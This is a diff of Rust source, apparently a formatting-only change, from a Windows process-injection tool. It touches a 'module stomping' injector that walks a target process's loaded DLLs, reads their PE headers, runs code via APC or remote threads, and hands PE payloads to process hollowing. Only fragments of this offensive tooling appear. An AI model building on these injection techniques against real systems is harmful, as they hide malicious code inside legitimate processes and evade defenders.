@@ -213,8 +213,10 @@ unsafe fn collect_peb_candidates(
     operator_exclusions: &[String],
     builtin_exclusions: &[&str],
 ) -> Result<Vec<DonorDll>> {
-    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{
+        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+    };
+    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
     // Read Ldr pointer from PEB (offset 0x18 on x86_64).
     let mut ldr_ptr = 0usize;
@@ -276,7 +278,10 @@ unsafe fn collect_peb_candidates(
             // Read PE headers from target process to locate the .text section.
             let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
             let (s, _) = nt_read_proc!(h_proc, dll_base as u64, &mut dos_header);
-            if s < 0 || dos_header.e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
+            if s < 0
+                || dos_header.e_magic
+                    != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE
+            {
                 let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                 if next_flink == current {
                     break;
@@ -298,7 +303,9 @@ unsafe fn collect_peb_candidates(
             }
 
             // Validate PE signature.
-            if nt_headers.Signature != windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE {
+            if nt_headers.Signature
+                != windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE
+            {
                 let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                 if next_flink == current {
                     break;
@@ -405,7 +412,9 @@ unsafe fn try_execute_via_apc(
     pid: u32,
     exec_addr: *mut std::ffi::c_void,
 ) -> bool {
-    use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32,
+    };
     use windows_sys::Win32::System::Threading::PROCESS_QUERY_INFORMATION;
     use windows_sys::Win32::System::Threading::THREAD_SET_CONTEXT;
 
@@ -545,14 +554,19 @@ unsafe fn execute_via_thread(
 #[cfg(windows)]
 impl Injector for ExistingModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
-        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
         use crate::win_types::PAGE_READWRITE;
+        use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
+        use windows_sys::Win32::System::Threading::{
+            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+            PROCESS_VM_READ, PROCESS_VM_WRITE,
+        };
 
         // If payload is a PE, delegate to process hollowing.
         let is_pe = payload_has_valid_pe_headers(payload);
         if is_pe {
-            tracing::info!("ExistingModuleStomp: PE payload detected, forwarding to process hollowing");
+            tracing::info!(
+                "ExistingModuleStomp: PE payload detected, forwarding to process hollowing"
+            );
             return match hollowing::windows_impl::inject_into_process(pid, payload) {
                 Ok(_) => Ok(()),
                 Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
@@ -575,8 +589,7 @@ impl Injector for ExistingModuleStompInjector {
             let mut client_id = [0u64; 2];
             client_id[0] = pid as u64;
             let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
-            obj_attr.Length =
-                std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+            obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
             let mut h_proc_val: usize = 0;
             let access_mask = (PROCESS_VM_OPERATION
